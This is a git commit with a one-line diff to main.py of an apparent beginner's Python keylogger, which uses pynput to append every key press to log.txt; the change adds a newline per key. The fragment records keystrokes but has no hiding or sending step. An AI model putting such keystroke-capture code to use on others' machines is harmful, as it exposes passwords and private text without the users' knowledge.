d2699fac9d8abcefa0efa248dad0266ebba7ef58
Gilly <105425316+GILLY-GATHOGO@users.noreply.github.com>
2023-01-05 08:39:19 +0300

    Update main.py

--- main.py
+++ main.py
@@ -5,7 +5,7 @@ from pynput.keyboard import Listener
 # ON_PRESS FUNCTION
 def on_press(key):
     with open('log.txt','a') as f:      # Everytime the Key is pressed,puts in log.txt in append mode and saves as f
-        f.write(str(key))
+        f.write(str(key)+'\n')
 
 # Everytime a Key is pressed...calls function on_press
 
